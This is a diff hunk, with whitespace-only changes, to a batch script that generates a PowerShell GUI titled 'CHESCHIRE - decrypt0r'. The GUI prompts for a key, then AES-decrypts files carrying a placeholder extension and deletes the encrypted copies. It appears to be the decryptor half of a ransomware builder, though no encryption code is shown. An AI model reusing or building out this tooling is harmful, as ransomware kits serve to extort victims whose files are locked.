@@ -133,9 +133,9 @@ echo $userForm.StartPosition = "CenterScreen" >> decryGUI.ps1
 echo $userForm.AutoSize = $False >> decryGUI.ps1
 echo $userForm.MinimizeBox = $False >> decryGUI.ps1
 echo $userForm.MaximizeBox = $False >> decryGUI.ps1
-echo $userForm.SizeGripStyle= "Hide" >> decryGUI.ps1
+echo $userForm.SizeGripStyle = "Hide" >> decryGUI.ps1
 echo $userForm.WindowState = "Normal" >> decryGUI.ps1
-echo $userForm.FormBorderStyle="Fixed3D" >> decryGUI.ps1
+echo $userForm.FormBorderStyle = "Fixed3D" >> decryGUI.ps1
 echo $OKButton = New-Object System.Windows.Forms.Button >> decryGUI.ps1
 echo $OKButton.Location = New-Object System.Drawing.Size(115,80) >> decryGUI.ps1
 echo $OKButton.Size = New-Object System.Drawing.Size(75,23) >> decryGUI.ps1
@@ -156,18 +156,18 @@ echo $userForm.Controls.Add($userLabel) >> decryGUI.ps1
 echo $objTextBox = New-Object System.Windows.Forms.TextBox >> decryGUI.ps1
 echo $objTextBox.Location = New-Object System.Drawing.Size(10,40) >> decryGUI.ps1
 echo $objTextBox.Size = New-Object System.Drawing.Size(260,20) >> decryGUI.ps1
-echo $objTextBox.Text="$defaultText" >> decryGUI.ps1
+echo $objTextBox.Text = "$defaultText" >> decryGUI.ps1
 echo $userForm.Controls.Add($objTextBox) >> decryGUI.ps1
 echo $userForm.Topmost = $True >> decryGUI.ps1
 echo $userForm.Opacity = 0.91 >> decryGUI.ps1
 echo $userForm.ShowIcon = $False >> decryGUI.ps1
 echo $userForm.Add_Shown({$userForm.Activate()}) >> decryGUI.ps1
 echo [void] $userForm.ShowDialog() >> decryGUI.ps1
-echo $value=$objTextBox.Text >> decryGUI.ps1
+echo $value = $objTextBox.Text >> decryGUI.ps1
 echo return $value >> decryGUI.ps1
 echo } >> decryGUI.ps1
 echo $secretkey = CustomInputBox "CHESCHIRE - decrypt0r" "Enter the decryption key" "" >> decryGUI.ps1
-echo if ( $secretkey -ne $null ){ >> decryGUI.ps1
+echo if ($secretkey -ne $null){ >> decryGUI.ps1
 echo Import-Module decry >> decryGUI.ps1
 echo $files = get-childitem folder_location -recurse -Include *cryExtension ^| where {^! $_.PSIsContainer} >> decryGUI.ps1
 echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText $secretkey -Suffix 'cryExtension' -RemoveSource } >> decryGUI.ps1
